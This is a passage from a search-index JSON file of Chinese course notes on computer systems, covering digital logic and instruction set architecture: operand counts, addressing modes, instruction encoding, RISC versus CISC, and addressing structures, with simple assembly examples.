\u662f\u963f\u8d1d\u5c14\u7fa4\uff0c\u6ee1\u8db3\u4ea4\u6362\u5f8b\uff0c\u4f46\u4e0d\u6ee1\u8db3\u7ed3\u5408\u5f8b","title":"\u6d6e\u70b9\u6570\u52a0\u6cd5"},{"location":"cs/system/cs1/topic2/","text":"\u6570\u5b57\u903b\u8f91\u57fa\u7840 \u00b6 Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u7b2c\u4e09\uff5e\u4e94\u5468\u8bfe\u7a0b\u5185\u5bb9 \u53c2\u8003\uff1a Computer Organization and Design: The Hardware/Software Interface (RISC-V edition) Appendix A: The Basics of Logic Design \u903b\u8f91\u4e0e\u8ba1\u7b97\u673a\u8bbe\u8ba1\u57fa\u7840\uff08\u7b2c\u4e94\u7248\uff09","title":"\u6570\u5b57\u903b\u8f91\u7535\u8def\u57fa\u7840"},{"location":"cs/system/cs1/topic2/#_1","text":"Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u7b2c\u4e09\uff5e\u4e94\u5468\u8bfe\u7a0b\u5185\u5bb9 \u53c2\u8003\uff1a Computer Organization and Design: The Hardware/Software Interface (RISC-V edition) Appendix A: The Basics of Logic Design \u903b\u8f91\u4e0e\u8ba1\u7b97\u673a\u8bbe\u8ba1\u57fa\u7840\uff08\u7b2c\u4e94\u7248\uff09","title":"\u6570\u5b57\u903b\u8f91\u57fa\u7840"},{"location":"cs/system/cs1/topic3/","text":"\u7ec4\u5408\u903b\u8f91\u7535\u8def \u00b6 Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u7b2c\u4e94\uff5e\u516b\u5468\u8bfe\u7a0b\u5185\u5bb9 \u53c2\u8003\uff1a","title":"\u7ec4\u5408\u903b\u8f91\u7535\u8def\u8bbe\u8ba1"},{"location":"cs/system/cs1/topic3/#_1","text":"Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u7b2c\u4e94\uff5e\u516b\u5468\u8bfe\u7a0b\u5185\u5bb9 \u53c2\u8003\uff1a","title":"\u7ec4\u5408\u903b\u8f91\u7535\u8def"},{"location":"cs/system/cs1/topic4/","text":"\u65f6\u5e8f\u903b\u8f91\u7535\u8def \u00b6 Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u7b2c\u516b\uff5e\u5341\u5468\u8bfe\u7a0b\u5185\u5bb9 \u53c2\u8003\uff1a","title":"\u65f6\u5e8f\u903b\u8f91\u7535\u8def\u8bbe\u8ba1"},{"location":"cs/system/cs1/topic4/#_1","text":"Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u7b2c\u516b\uff5e\u5341\u5468\u8bfe\u7a0b\u5185\u5bb9 \u53c2\u8003\uff1a","title":"\u65f6\u5e8f\u903b\u8f91\u7535\u8def"},{"location":"cs/system/cs1/topic5/","text":"\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784 \u00b6 Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u7b2c\u5341\u4e00\uff5e\u5341\u4e8c\u5468\u8bfe\u7a0b\u5185\u5bb9 \u53c2\u8003\uff1a \u903b\u8f91\u4e0e\u8ba1\u7b97\u673a\u8bbe\u8ba1\u57fa\u7840\uff08\u7b2c\u4e94\u7248\uff09 \u7b2c\u4e5d\u7ae0\u3001\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784 ISA \u6982\u5ff5 \u00b6 \u6307\u4ee4 \u00b6 \u6307\u4ee4\uff08instruction\uff09= \u64cd\u4f5c\u7b26\uff08opcode\uff09+ \u64cd\u4f5c\u6570\uff08operand\uff09 \u6307\u4ee4\u683c\u5f0f\u5305\u542b\u957f\u5ea6\u3001\u64cd\u4f5c\u6570\u4e2a\u6570\u3001\u5bc4\u5b58\u5668\u4e2a\u6570\u3001\u5bfb\u5740\u5185\u5b58\u5927\u5c0f\u3001\u5bfb\u5740\u6a21\u5f0f\u7b49 \u6307\u4ee4\u96c6 \u00b6 CPU \u53ef\u4ee5\u201c\u7406\u89e3\u201d\u7684\u4e00\u7cfb\u5217\u6307\u4ee4\uff0c\u4ee5\u4e8c\u8fdb\u5236\u673a\u5668\u7801\uff08machine code\uff09\u7684\u5f62\u5f0f\u8868\u73b0 \u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784 \u00b6 \u89c4\u5b9a\u4e86\u6240\u6709\u786c\u4ef6\u5b9e\u73b0\u7684\u6307\u4ee4\u3001\u89c4\u5b9a\u4e86\u6307\u4ee4\u7b26\u53f7\u540d\u79f0\u3001\u4e8c\u8fdb\u5236\u7f16\u7801\u683c\u5f0f\uff0c\u63d0\u4f9b\u4e86\u6bcf\u6761\u6307\u4ee4\u7cbe\u786e\u5b9a\u4e49\u7684\u201d\u624b\u518c\u201c\u5373\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784\uff08ISA\uff0cInstruction Set Architecture\uff09 \u8ba1\u7b97\u673a\u6839\u636e ISA \u5b9e\u73b0\uff0cISA \u53ef\u4ee5\u6709\u591a\u79cd\u5b9e\u73b0\u3001ISA \u4f7f\u8f6f\u4ef6\u53ef\u4ee5\u64cd\u7eb5\u786c\u4ef6\u3001ISA \u5b9a\u4e49\u4e86\u673a\u5668\u8bed\u8a00\uff0cISA \u89c4\u5b9a\u4e86\u5fae\u5904\u7406\u5668\uff08microprocessor\uff09\u7684\u8bbe\u8ba1\uff08ISA \u5b9a\u4e49\u4e86 CPU \u6216\u8005\u4e00\u7c7b CPU\uff0c\u5b83\u5305\u542b CPU \u7684\u5185\u5b58\u89c6\u56fe\u3001\u5bc4\u5b58\u5668\u4e2a\u6570\u7b49\u4fe1\u606f\uff0c\u800c\u4e0d\u53ea\u662f\u4e00\u7cfb\u5217\u6307\u4ee4\u7684\u96c6\u5408\uff09 \u6ce8\uff1a\u4f53\u7cfb\u7ed3\u6784\u8986\u76d6\u6574\u4e2a\u8ba1\u7b97\u673a\uff0c\u5305\u62ec ISA\u3001\u7ec4\u6210\u548c\u786c\u4ef6\uff0c\u800c\u4e0d\u4ec5\u4ec5\u662f ISA\u3002ISA \u4e5f\u4e0d\u662f CPU \u7684\u4f53\u7cfb\u7ed3\u6784\uff08\u540c\u4e00 ISA \u6709\u4e0d\u540c\u79cd CPU\uff09 ISA \u8bbe\u8ba1 \u00b6 \u8bbe\u8ba1\u539f\u5219 \u00b6 \u6307\u4ee4\u683c\u5f0f\u8bbe\u8ba1\u539f\u5219 \u00b6 \u6307\u4ee4\u957f\u5ea6\u8981\u77ed \u4e3a\u65b0\u7684 opcode \u7559\u51fa\u8db3\u591f\u7a7a\u95f4 \u6709\u533a\u5206\u6027\u7684\u7f16\u7801 \u8bbe\u8ba1\u597d\u64cd\u4f5c\u6570\u7684\u4e2a\u6570 \u8bbe\u8ba1\u597d\u6307\u4ee4\u7684\u5bf9\u9f50\u6a21\u5f0f \u4fdd\u6301\u89c4\u8303\u5316 ISA \u8bbe\u8ba1\u539f\u5219 \u00b6 Simplicity favors regularity Make the common case fast Smaller is faster Good design demands good compromises \u64cd\u4f5c\u6570 \u00b6 \u64cd\u4f5c\u6570\u4e2a\u6570 \u00b6 \u4e00\u822c\u6ca1\u6709 4 \u4e2a\u6216\u4ee5\u4e0a\u64cd\u4f5c\u6570\u7684\u6307\u4ee4\uff0c\u8fd9\u6837\u6bcf\u4e2a\u64cd\u4f5c\u6570\u4e0d\u4e00\u5b9a\u90fd\u4f1a\u7528\u4e0a\uff0c\u800c\u4e14\u4f1a\u589e\u52a0 CPU \u7684\u590d\u6742\u5ea6\uff0c\u5e76\u4e14\u4f7f\u6307\u4ee4\u53d8\u957f \u5927\u90e8\u5206\u6307\u4ee4\u96c6\u5747\u6709 0/1/2/3 \u4e2a\u64cd\u4f5c\u6570\u3002\u4e0b\u9762\u4ee5\u8ba1\u7b97 Y = (A - B) / (C + (D * E)) \u4e3a\u4f8b\u5b50 \u4e09\u64cd\u4f5c\u6570\u6307\u4ee4 \u00b6 \u53ef\u4ee5\u6709\u4e24\u4e2a\u6e90\u64cd\u4f5c\u6570\u548c\u4e00\u4e2a\u76ee\u7684\u64cd\u4f5c\u6570 SUB R1 , A , B MUL R2 , D , E ADD R2 , R2 , C DIV R1 , R1 , R2 \u4e09\u64cd\u4f5c\u6570\u7684\u6307\u4ee4\u4f18\u70b9\u662f\u53ef\u4ee5\u5f88\u7075\u6d3b\u5730\u6307\u5b9a\u7ed3\u679c\u5b58\u653e\u5728\u54ea\u91cc\uff0c\u8ba1\u7b97\u8868\u8fbe\u5f0f\u7684\u7a0b\u5e8f\u5f88\u77ed\uff0c\u7f3a\u70b9\u662f\u4e8c\u8fdb\u5236\u7f16\u7801\u6307\u4ee4\u65f6\u9700\u8981\u7528\u8f83\u591a\u4f4d\u6570\u6765\u6307\u5b9a\u4e09\u4e2a\u5730\u5740 \u4e8c\u64cd\u4f5c\u6570\u6307\u4ee4 \u00b6 \u538b\u7f29\u76ee\u7684\u64cd\u4f5c\u6570\u5230\u6e90\u64cd\u4f5c\u6570\uff0c\u4e5f\u5c31\u662f\u7528\u4e00\u4e2a\u6e90\u64cd\u4f5c\u6570\u540c\u65f6\u4ee3\u8868\u76ee\u7684 SUB A , B ; A <- A - B MUL D , E ; D <- D * E ADD D , C ; D <- D + C DIV A , D ; A <- A / D \u4f46\u662f\u8fd9\u6837\u4f1a\u66f4\u6539 ABCDE \u539f\u6765\u7684\u503c\uff0c\u6240\u4ee5\u9700\u8981\u901a\u8fc7 MOV \u7c7b\u6307\u4ee4\u6765\u6682\u5b58\u7528\u505a\u8ba1\u7b97\uff1a MOV R1 , A MOV R2 , D SUB R1 , B MUL R2 , E ADD R2 , C DIV R1 , R2 \u6240\u4ee5\u5b83\u4f1a\u6bd4\u4e09\u64cd\u4f5c\u6570\u6307\u4ee4\u7684\u6307\u4ee4\u6761\u6570\u66f4\u591a \u4e00\u64cd\u4f5c\u6570\u6307\u4ee4 \u00b6 \u53ef\u4ee5\u901a\u8fc7\u7ee7\u7eed\u9690\u85cf\u4e00\u4e2a\u64cd\u4f5c\u6570\u7684\u65b9\u6cd5\u6765\u6784\u9020\u51fa\u4e00\u64cd\u4f5c\u6570\u7684\u6307\u4ee4\uff0c\u6bd4\u5982\u89c4\u5b9a\u8fd0\u7b97\u4e2d\u7684\u4e00\u4e2a\u64cd\u4f5c\u6570\u548c\u76ee\u7684\u90fd\u4e3a Acc\uff08\u7d2f\u52a0\u5668\uff09 LDA D ; Acc <- D MUL E ; Acc <- Acc * E ADD C ; Acc <- Acc + C STO R1 ; R1 <- Acc LDA A ; Acc <- A SUB B ; Acc <- Acc - B DIV R1 ; Acc <- Acc / R1 \u8fd9\u6837\u6307\u4ee4\u6761\u6570\u4f1a\u66f4\u591a\uff0c\u4f46\u662f CPU \u5374\u66f4\u5bb9\u6613\u8bbe\u8ba1 \u96f6\u64cd\u4f5c\u6570\u6307\u4ee4 \u00b6 \u56e0\u4e3a\u662f\u96f6\u64cd\u4f5c\u6570\uff0c\u6240\u4ee5\u6307\u4ee4\u8fd0\u7b97\u4e2d\u7684\u4e09\u4e2a\u5730\u5740\u90fd\u662f\u9690\u5f0f\u7684\uff0c\u53ef\u4ee5\u4f7f\u7528\u6808\u6765\u64cd\u4f5c\uff0c\u5373\u6bcf\u6b21\u8fd0\u7b97\u53d6\u51fa\u6808\u9876\u4e24\u4e2a\u5143\u7d20\u7136\u540e\u8fd0\u7b97\u540e\u5c06\u7ed3\u679c\u538b\u56de\u6808\u4e2d PUSH B ; B PUSH A ; B, A SUB ; A-B PUSH E ; A-B, E PUSH D ; A-B, E, D MUL ; A-B, D*E PUSH C ; A-B, D*E, C ADD ; A-B, C+D*E DIV ; (A-B)/(C+D*E) \u53ef\u89c1\u64cd\u4f5c\u6570\u8d8a\u591a\uff0c\u6307\u4ee4\u8d8a\u590d\u6742\u4f46\u7a0b\u5e8f\u5305\u542b\u7684\u6307\u4ee4\u6761\u6570\u5c11\uff1b\u64cd\u4f5c\u6570\u8d8a\u591a\uff0c\u6307\u4ee4\u8d8a\u7b80\u5355\uff0c\u6307\u4ee4\u6267\u884c\u8d8a\u5feb\uff0c\u4f46\u7a0b\u5e8f\u5305\u542b\u7684\u6307\u4ee4\u6761\u6570\u4e5f\u4f1a\u8d8a\u591a \u5bfb\u5740\u6a21\u5f0f \u00b6 \u5728\u6307\u4ee4\u6267\u884c\u7684\u8fc7\u7a0b\u4e2d\uff0c\u5982\u4f55\u83b7\u53d6\u64cd\u4f5c\u6570\u53d6\u51b3\u4e8e\u6307\u4ee4\u7684\u5bfb\u5740\u6a21\u5f0f\u3002\u5bfb\u5740\u6a21\u5f0f\u6307\u5b9a\u4e86\u4e00\u4e2a\u5728\u5b9e\u9645\u8bbf\u95ee\u64cd\u4f5c\u6570\u4e4b\u524d\uff0c\u89e3\u91ca\u6216\u8c03\u6574\u6307\u4ee4\u5730\u5740\u5b57\u6bb5\u7684\u89c4\u5219\uff0c\u7528\u8fd9\u4e2a\u89c4\u5219\u53ef\u4ee5\u751f\u6210\u64cd\u4f5c\u6570\u7684\u6709\u6548\u5730\u5740\uff08effective address\uff09\u3002 \u5bfb\u5740\u6a21\u5f0f\u53ef\u4ee5\u6307\u5b9a\u5230\u5e38\u6570\u3001\u5bc4\u5b58\u5668\u548c\u5185\u5b58\u5730\u5740\u3002\u9ad8\u6548\u7684\u5bfb\u5740\u6a21\u5f0f\u8bbe\u8ba1\u53ef\u4ee5\u51cf\u5c11\u6307\u4ee4\u7684\u957f\u5ea6\u3002\u4e0b\u9762\u662f\u4e00\u4e9b\u5e38\u89c1\u7684\u5bfb\u5740\u6a21\u5f0f \u7acb\u5373\u6570\u5bfb\u5740 \u00b6 \u7acb\u5373\u6570\u5bfb\u5740\uff08immediate addressing\uff09\u5373\u64cd\u4f5c\u6570\u5c31\u5728\u6307\u4ee4\u5f53\u4e2d\uff0c\u4e5f\u5c31\u662f\u6307\u4ee4\u4e2d\u6709\u4e00\u4e2a\u64cd\u4f5c\u6570\u5b57\u6bb5\u5c31\u4ee3\u8868\u4e86\u8fd9\u4e2a\u5e38\u6570\u672c\u8eab\u800c\u4e0d\u662f\u5730\u5740\u3002 \u76f4\u63a5\u5bfb\u5740 \u00b6 \u76f4\u63a5\u5bfb\u5740\uff08direct addressing\uff09\u5373\u64cd\u4f5c\u6570\u4f5c\u4e3a\u5185\u5b58\u5730\u5740\uff0c\u76f4\u63a5\u8bfb\u53d6\u8be5\u5730\u5740\u5904\u7684\u503c\u8fdb\u884c\u64cd\u4f5c\uff0c\u4e5f\u5c31\u662f\u6307\u4ee4\u4e2d\u6709 ADRS\uff0c\u4f46\u5b9e\u9645\u7528\u7684\u662f M[ADRS] \u8fd9\u5c31\u6709\u4e86\u4e00\u4e2a\u95ee\u9898\uff0c\u5982\u679c\u662f 32 \u4f4d\u7684\u5730\u5740\uff0c\u6307\u4ee4\u4e5f\u662f 32 \u4f4d\u7684\uff0c\u4e0d\u80fd\u653e\u4e0b\u5b8c\u6574\u7684\u5730\u5740\uff0c\u6240\u4ee5\u4e00\u822c\u4f7f\u7528\u6bb5\u5730\u5740\u548c\u504f\u79fb\u5730\u5740\u914d\u5408\uff0c\u9690\u542b\u4e00\u4e2a\u6bb5\u5730\u5740\uff0c\u7136\u540e ADRS \u4ec5\u4f7f\u7528\u504f\u79fb\u5730\u5740\u3002\u4f46\u662f\u76f4\u63a5\u5bfb\u5740\u9700\u8981\u5728\u6c47\u7f16\u7684\u65f6\u5019\u5c31\u77e5\u9053\u51c6\u786e\u7684\u5730\u5740\u4f4d\u7f6e \u76f4\u63a5\u5bfb\u5740\u7684\u5730\u5740\u4e5f\u53ef\u4ee5\u4ee3\u8868\u4e00\u4e2a\u5bc4\u5b58\u5668 \u95f4\u63a5\u5bfb\u5740 \u00b6 \u95f4\u63a5\u5bfb\u5740\uff08indire addressing\uff09\u5373\u64cd\u4f5c\u6570\u4e2d\u5305\u542b\u5185\u5b58\u5730\u5740\uff0c\u8fd9\u4e2a\u5185\u5b58\u5730\u5740\u5904\u7684\u503c\u8fd8\u662f\u4e00\u4e2a\u5730\u5740\uff0c\u8fd9\u4e2a\u5730\u5740\u6240\u6307\u5411\u7684\u4f4d\u7f6e\u662f\u5b9e\u9645\u8981\u7528\u7684\u6570\u3002\u4e5f\u5c31\u662f\u6307\u4ee4\u4e2d\u6709 ADRS\uff0c\u4f46\u5b9e\u9645\u7528\u7684\u662f M[M[ADRS]] ADRS \u5fc5\u987b\u5728\u6c47\u7f16\u7684\u65f6\u5019\u56fa\u5b9a\uff0c\u4f46\u662f ADRS \u6240\u6307\u5411\u7684\u4f4d\u7f6e\u53ef\u4ee5\u662f\u53d8\u5316\u7684\uff0c\u8fd9\u6837\u53ef\u4ee5\u4f7f\u8bbf\u95ee\u6570\u7ec4\u8fd9\u6837\u7684\u64cd\u4f5c\u53d8\u5f97\u66f4\u65b9\u4fbf ADRS \u4e5f\u53ef\u4ee5\u662f\u4e00\u4e2a\u5bc4\u5b58\u5668 \u53d8\u5740\u5bfb\u5740\u4e0e\u57fa\u5740\u5bfb\u5740 \u00b6 \u4e8c\u8005\u5f88\u76f8\u4f3c\uff0c\u90fd\u662f\u5c06\u5bc4\u5b58\u5668\u503c\u4e0e\u5730\u5740\u52a0\u8d77\u6765\u7684\u548c\u4f5c\u4e3a\u5b9e\u9645\u8981\u8bbf\u95ee\u7684\u5730\u5740 \u53d8\u5740\u5bfb\u5740\uff08indexed addressing\uff09\uff0c\u5bc4\u5b58\u5668\u4fdd\u5b58\u7684\u662f\u504f\u79fb\u5730\u5740\uff0c\u6307\u4ee4\u4e2d\u5730\u5740\u4fdd\u5b58\u7684\u662f\u57fa\u5730\u5740 \u57fa\u5740\u5bfb\u5740\uff08based addressing\uff09\uff0c\u5bc4\u5b58\u5668\u4fdd\u5b58\u7684\u662f\u57fa\u5730\u5740\uff0c\u6307\u4ee4\u4e2d\u5730\u5740\u662f\u504f\u79fb\u5730\u5740 \u603b\u7ed3\uff1a \u5bfb\u5740\u6a21\u5f0f \u8868\u793a\u6cd5 \u542b\u4e49 \u7acb\u5373\u6570\u5bfb\u5740 #K K \u76f4\u63a5\u5bfb\u5740 K M[K] \u95f4\u63a5\u5bfb\u5740 (K) M[M[K]] \u5bc4\u5b58\u5668\u5bfb\u5740 (Rn) M[Rn] \u5bc4\u5b58\u5668\u53d8\u5740\u5bfb\u5740 (Rm+Rn) M[Rm+Rn] \u5bc4\u5b58\u5668\u57fa\u5740\u5bfb\u5740 (Rm+X) M[Rm+X] \u5bc4\u5b58\u5668\u57fa\u5740\u53d8\u5740\u5bfb\u5740 (Rm+Rn+X) M[Rm+Rn+X] \u64cd\u4f5c\u7c7b\u578b\u53ca\u7f16\u7801 \u00b6 \u64cd\u4f5c\u7c7b\u578b \u00b6 \u4e00\u822c\u7684\u6307\u4ee4\u96c6\u90fd\u5305\u542b\u4e0b\u9762\u8fd9\u4e9b\u79cd\u64cd\u4f5c\u7c7b\u578b\uff1a \u7b97\u6570\u8fd0\u7b97\u3001\u903b\u8f91\u8fd0\u7b97 \u79fb\u4f4d\u8fd0\u7b97 \u6570\u636e\u4f20\u9001\uff08MOV/LOAD/STORE \u4e4b\u7c7b\uff09 \u5b57\u7b26\u4e32\u8fd0\u7b97 \u63a7\u5236\u6d41\u53d8\u5316\uff08BRANCH/JMP/CALL/RET \u7b49\uff09 \u7cfb\u7edf\u6307\u4ee4\uff08HALT/INT \u7b49\uff09 \u8f93\u5165\u8f93\u51fa ... \u6307\u4ee4\u7f16\u7801 \u00b6 \u6307\u4ee4\u7f16\u7801\u7684\u957f\u5ea6\u6709\u51e0\u79cd \u53d8\u957f\uff08Variable\uff09\uff1a\u6bcf\u6761\u6307\u4ee4\u7684\u957f\u5ea6\u90fd\u4e0d\u4e00\u5b9a \u5b9a\u957f\uff08Fixed\uff09\uff1a\u6240\u6709\u6307\u4ee4\u90fd\u662f\u540c\u4e00\u957f\u5ea6 \u6df7\u5408\uff08Hybrid\uff09\uff1a\u6709\u591a\u79cd\u6307\u4ee4\u7684\u957f\u5ea6 \u4e00\u822c\u5982\u679c\u4ee3\u7801\u7684\u5927\u5c0f\u6700\u91cd\u8981\u7684\u8bdd\u9009\u62e9\u53d8\u957f\u6307\u4ee4\uff0c\u5982\u679c\u662f\u6267\u884c\u8868\u73b0\u6700\u91cd\u8981\u7684\u8bdd\u9009\u62e9\u5b9a\u957f\u6307\u4ee4\u3002\u800c\u4e00\u4e9b\u4e3a\u4e86\u517c\u5bb9\uff0c\u53ef\u80fd\u4f1a\u9009\u62e9\u6df7\u5408\u957f\u5ea6\u6307\u4ee4 RISC \u4e0e CISC \u00b6 CISC \u00b6 CISC\uff08Complex Instruction Set Computer\uff09\u5373\u590d\u6742\u6307\u4ee4\u96c6\u8ba1\u7b97\u673a \u7f16\u7a0b\u548c\u6267\u884c\u4e4b\u95f4\u7684\u8bed\u4e49\u95f4\u9694\uff08semantic gap\uff09\u5c0f \u7a0b\u5e8f\u673a\u5668\u7801\u4f53\u79ef\u5c0f \u7f16\u8bd1\u8fc7\u7a0b\u7b80\u5355 CISC \u7c7b\u578b\u7684\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784\u6709 x86\u3001Intel 432\u3001IBM 360\u3001DEC VAX \u7b49 RISC \u00b6 RISC\uff08Reduced Instruction Set Computer\uff09\u5373\u7cbe\u7b80\u6307\u4ee4\u96c6\u8ba1\u7b97\u673a \u7531 IBM \u53d1\u660e RISC \u7684\u6307\u4ee4\u5f88\u5c11\uff0c\u800c\u4e14\u6bcf\u4e2a\u6307\u4ee4\u7b80\u5355\uff0c\u957f\u5ea6\u56fa\u5b9a CISC \u6bcf\u589e\u52a0\u4e00\u4e2a\u6307\u4ee4\u90fd\u4f1a\u4f7f\u89e3\u7801\u53d8\u6162\uff0c\u4ece\u800c\u4f7f\u6574\u4e2a ISA \u90fd\u4f1a\u53d8\u6162\uff0c\u4f46 RISC \u4e0d\u4f1a \u8fd0\u7b97\u7684\u64cd\u4f5c\u6570\u90fd\u662f\u5bc4\u5b58\u5668\uff08reg-reg\uff09 \u7f16\u8bd1\u4f1a\u66f4\u590d\u6742 RISC \u7c7b\u578b\u7684\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784\u6709 RISC I\u3001RISC II\u3001MIPS\u3001ARM\u3001RISC V \u7b49 CISC \u4e0e RISC \u533a\u522b\uff1a CISC RISC \u53d8\u957f\u6307\u4ee4 \u5b9a\u957f\u6307\u4ee4 \u5927\u91cf\u6307\u4ee4\u548c\u5bfb\u5740\u6a21\u5f0f \u6307\u4ee4\u548c\u5bfb\u5740\u6a21\u5f0f\u90fd\u5f88\u5c11 \u7f16\u7801\u957f\u3001\u590d\u6742 \u7f16\u7801\u7b80\u5355 \u5305\u542b\u4ece\u5185\u5b58\u5230\u5185\u5b58\u7684\u64cd\u4f5c \u53ea\u80fd\u5b58/\u53d6 \u4f7f\u7528\u5fae\u6307\u4ee4 \u6ca1\u6709\u5fae\u6307\u4ee4\uff0c\u4e00\u5207\u90fd\u76f4\u63a5\u4ece\u6307\u4ee4\u4e2d\u89e3\u7801\u51fa\u6765 \u8bed\u4e49\u95f4\u9694\u5c0f \u9700\u8981\u66f4\u667a\u80fd\u7684\u7f16\u8bd1\u5668 CISC \u548c RISC \u5728\u53d1\u5c55\u4e2d\u4e5f\u4e0d\u5e94\u5b8c\u5168\u5272\u88c2 \u5bfb\u5740\u7ed3\u6784 \u00b6 \u5bfb\u5740\u7ed3\u6784\u6709\u51e0\u79cd\uff1a \u7d2f\u52a0\u5668\u7ed3\u6784\uff0cAccumulator\uff081960 \u524d\uff0c\u5982 68HC11\uff09 \u6808\u7ed3\u6784\uff0cStack\uff081960s ~ 1970s\uff09 \u5b58\u50a8\u5668\u5230\u5b58\u50a8\u5668\u7ed3\u6784\uff0cMemory-Memory\uff081970s ~ 1980s\uff09 \u5bc4\u5b58\u5668\u5230\u5b58\u50a8\u5668\u7ed3\u6784\uff0cRegister-Memory\uff081970s \u81f3\u4eca\uff0c\u5982 x86\uff09 \u5bc4\u5b58\u5668\u5230\u5bc4\u5b58\u5668\u7ed3\u6784\uff0cRegister-Register\uff081960s \u81f3\u4eca\uff0c\u5982 MIPS\uff09\uff0c\u53c8\u79f0\u88c5\u8f7d/\u5b58\u50a8\u7ed3\u6784\uff08Load/Store\uff09 \u6808\u7ed3\u6784 \u00b6 ALU \u8fd0\u7b97\u6ca1\u6709\u64cd\u4f5c\u6570\uff0cpush/pop \u6709\u4e00\u4e2a\u64cd\u4f5c\u6570 \u4f18\u70b9 \u6307\u4ee4\u77ed \u786c\u4ef6\u8981\u6c42\u4f4e \u7f16\u8bd1\u5668\u597d\u5199 \u7f3a\u70b9 \u6548\u7387\u4f4e \u6808\u7a7a\u95f4\u6709\u9650 \u5e76\u884c\u6216\u6d41\u6c34\u7ebf\u80fd\u529b\u5f31 \u7f16\u8bd1\u5668\u96be\u4f18\u5316 \u4f8b\u5b50\uff1a60 \u5e74\u4ee3\u7684 B5500/6500 HP3000/70\uff0c\u73b0\u5728\u7684 Java \u865a\u62df\u673a \u7d2f\u52a0\u5668\u7ed3\u6784 \u00b6 \u4f7f\u7528\u5355\u4e2a\u64cd\u4f5c\u6570\uff08\u4e00\u4e2a\u663e\u5f0f\u4e00\u4e2a\u9690\u542b\uff09 \u6307\u4ee4\u6709 ALU \u8fd0\u7b97\u3001\u52a0\u8f7d\u5230\u7d2f\u52a0\u5668\u3001\u4ece\u7d2f\u52a0\u5668\u8f93\u51fa\u5230\u5b58\u50a8\u5668 \u4f18\u70b9 \u786c\u4ef6\u8981\u6c42\u6781\u4f4e \u6613\u4e8e\u8bbe\u8ba1\u3001\u7406\u89e3 \u7f3a\u70b9 \u7d2f\u52a0\u5668\u6210\u4e3a\u74f6\u9888 \u5e76\u884c/\u6d41\u6c34\u7ebf\u80fd\u529b\u5f31 \u9700\u8981\u7684 load store \u5f88\u591a\uff0c\u5185\u5b58\u8bfb\u5199\u9891\u7e41 \u4f8b\u5b50\uff1a\u65e9\u671f IBM 7090 \u7b49\uff0c\u73b0\u5728\u7684 DSP \u7ed3\u6784 \u5b58\u50a8\u5668\u5230\u5b58\u50a8\u5668\u7ed3\u6784 \u00b6 \u6240\u6709\u7684 ALU \u8fd0\u7b97\u90fd\u4ece\u5b58\u50a8\u5668\u8bfb\u5199 \u4f18\u70b9 \u65e0\u9700\u4f7f\u7528\u5bc4\u5b58\u5668 \u9700\u8981\u7684\u6307\u4ee4\u6570\u91cf\u5c11 \u5bb9\u6613\u5199\u7f16\u8bd1\u5668 \u7f3a\u70b9 \u6307\u4ee4\u957f\u5ea6\u53d8\u5316\u5927 \u6bcf\u6761\u6307\u4ee4\u6267\u884c\u7684\u65f6\u95f4\u6d6e\u52a8\u4e5f\u5927 \u5de8\u5927\u7684\u5b58\u50a8\u5668\u8bfb\u5199\u5bfc\u81f4\u6548\u7387\u4f4e \u4f8b\u5b50\uff1aVAX \u5bc4\u5b58\u5668\u5230\u5b58\u50a8\u5668\u7ed3\u6784 \u00b6 ALU \u64cd\u4f5c\u4e2d\u6709\u4e00\u4e2a\u5b58\u50a8\u5668 \u4e00\u822c\u6307\u4ee4\u6709\u4e24\u4e2a\u64cd\u4f5c\u6570 \u4f18\u70b9 \u6307\u4ee4\u6570\u91cf\u5c11 \u6307\u4ee4\u6613\u4e8e\u7f16\u89e3\u7801 \u7f3a\u70b9 \u8fd0\u7b97\u7ed3\u679c\u4f1a\u8986\u76d6\u539f\u503c \u6307\u4ee4\u957f\u5ea6\u53d8\u5316\u5927 \u6307\u4ee4\u8fd0\u884c\u65f6\u95f4\u53d8\u5316\u5927 \u53ef\u80fd\u4f1a\u9650\u5236\u5bc4\u5b58\u5668\u4e2a\u6570 \u4f8b\u5b50\uff1aIBM 360/370\u3001VAX \u88c5\u8f7d/\u5b58\u50a8\u7ed3\u6784 \u00b6 ALU \u6307\u4ee4\u4e2d\u4e0d\u9700\u8981\u5b58\u50a8\u5668 \u4e00\u822c\u6307\u4ee4\u6709\u4e09\u4e2a\u64cd\u4f5c\u6570 \u4f18\u70b9 \u7b80\u5355\u3001\u5b9a\u957f\u7684\u6307\u4ee4\u7f16\u7801 \u6307\u4ee4\u8fd0\u884c\u7684\u65f6\u95f4\u53d8\u5316\u5c0f \u6613\u4e8e\u8fdb\u884c\u6d41\u6c34\u7ebf \u7f3a\u70b9 \u6307\u4ee4\u4e2a\u6570\u591a \u5e76\u4e0d\u662f\u6240\u6709\u64cd\u4f5c\u90fd\u6709\u4e09\u4e2a\u64cd\u4f5c\u6570 \u9700\u8981\u66f4\u597d\u7684\u7f16\u8bd1\u5668 \u4f8b\u5b50\uff1aCDC6600\u3001CRAY-1\u3001\u5927\u90e8\u5206 RISC \u5bc4\u5b58\u5668\u7684\u4f18\u7f3a\u70b9 \u4f18\u70b9 \u6bd4\u5b58\u50a8\u5668\u8bfb\u5199\u66f4\u5feb \u66f4\u660e\u786e \u9700\u8981\u66f4\u5c11\u6bd4\u7279\u5c31\u80fd\u5b9a\u4f4d\u4f7f\u7528\u54ea\u4e2a\u5bc4\u5b58\u5668 \u8282\u7701\u5185\u5b58\u8bfb\u5199 \u7f3a\u70b9 \u5728\u8fdb\u884c\u8fc7\u7a0b\u8c03\u7528\u7684\u65f6\u5019\u9700\u8981\u4fdd\u62a4\u5bc4\u5b58\u5668\uff08\u5b58\u50a8/\u6062\u590d\uff09 \u4e0d\u80fd\u53d6\u4e00\u4e2a\u5bc4\u5b58\u5668\u7684\u5730\u5740 